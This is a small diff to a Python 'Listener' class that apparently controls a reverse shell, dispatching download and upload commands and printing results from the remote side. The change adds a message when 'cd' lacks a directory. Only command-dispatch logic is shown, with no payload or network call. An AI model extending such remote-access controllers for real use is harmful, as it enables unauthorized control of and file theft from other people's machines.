@@ -62,6 +62,8 @@ class Listener:
                     self.download(cmd[1])
                 if cmd[0] == "upload":
                     self.upload(cmd[1])
+                if len(cmd)<2 and cmd[0] == "cd":
+                    print("[-] Please select a directory")
                 else:
                     result = self.r_recv()
                     print(result)
